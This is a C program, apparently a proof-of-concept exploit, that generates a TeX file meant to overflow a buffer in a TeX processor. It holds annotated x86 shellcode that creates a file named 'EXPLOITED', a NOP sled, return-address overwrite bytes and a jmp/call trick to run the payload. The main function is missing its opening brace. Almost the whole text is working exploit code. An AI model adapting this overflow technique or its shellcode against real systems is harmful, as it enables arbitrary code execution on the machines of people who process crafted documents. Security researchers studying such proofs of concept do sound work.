char center[] = {
  0x59                         /*   cx = *sp++                      */
, 0x31, 0xc0                   /*   ax ^= ax                        */
, 0x40                         /*   ++ax                            */
, 0x40                         /*   ++ax                            */
, 0x40                         /*   ++ax                            */
, 0xc1, 0xe0, 0x07             /*   ax <<= 7                        */
, 0x50                         /*   *--sp = ax                 0600 */
, 0xb8, 0x12, 0x34, 0x56, 0x02 /*   ax = 0x02563412                 */
, 0xc1, 0xe8, 0x18             /*   ax >>= 24                       */
, 0xc1, 0xe0, 0x08             /*   ax <<= 8                        */
, 0x50                         /*   *--sp = ax          512:O_CREAT */
, 0x51                         /*   *--sp = cx          "EXPLOITED" */
, 0x31, 0xc0                   /*   ax ^= ax                        */
, 0xb0, 0x05                   /*   ax = (ax & ~255) + 5            */
, 0x50                         /*   *--sp = ax               5:open */
, 0xcd, 0x80                   /*   syscall                         */
, 0x31, 0xc0                   /*   ax ^= ax                        */
, 0x50                         /*   *--sp = ax                    0 */
, 0x40                         /*   ++ax                            */
, 0x50                         /*   *--sp = ax               1:exit */
, 0xcd, 0x80                   /*   syscall                         */
} ;

int main()
 
  int i;

  printf("\\def\\row#1{");

  for (i = 0;i < 1024;++i)
    putchar('x');
  for (i = 0;i < 6;++i) {
    /* preserve args[0] */
    putchar(0x40); putchar(0x6d); putchar(0x08); putchar(0x08);
  }
  for (i = 0;i < 5;++i) {
    /* smasher */
    putchar(0x40); putchar(0xf9); putchar(0xbf); putchar(0xbf);
  }

  for (i = 0;i < 256;++i)
    putchar(0x90);

  putchar(0xeb); putchar(sizeof(center));
  /* 0xeb 0x07   means   ip += 7 */
  /* assuming here that center has at most 255 bytes */

  for (i = 0;i < sizeof center;++i)
    putchar(center[i]);

  putchar(0xe8);
  putchar(251 - sizeof center); putchar(0xff); putchar(0xff); putchar(0xff);
  /* 0xe8 0xf4 0xff 0xff 0xff   means   *--sp = ip; ip -= 12 */ 

  printf("EXPLOITED");

  printf("}\n");
  printf("\\begin{document}\n");
  printf("\\row a\n");
  printf("\\end{document}\n");
}
